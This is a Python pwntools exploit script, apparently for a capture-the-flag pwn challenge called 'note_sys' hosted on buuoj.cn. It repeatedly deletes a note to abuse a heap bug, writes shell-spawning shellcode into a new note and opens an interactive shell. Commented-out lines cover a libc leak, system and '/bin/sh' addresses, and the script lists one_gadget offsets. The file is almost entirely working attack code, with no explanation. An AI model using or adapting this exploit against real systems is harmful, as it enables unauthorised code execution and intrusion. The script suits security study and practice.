import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='note_sys'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',26341)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/home/keer/LibcSearcher-master/libc-database/db/libc6_2.23-0ubuntu10_amd64.so')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(c):
			io.sendlineafter('choice:','0')
			io.sendafter('input your note, no more than 250 characters',c)

		def delete():
			io.sendlineafter('choice:','2')
			

		

		for i in range(20):
			delete()

		for i in range(0x1):
			add(asm(shellcraft.sh()))

		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['_IO_2_1_stdout_']
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue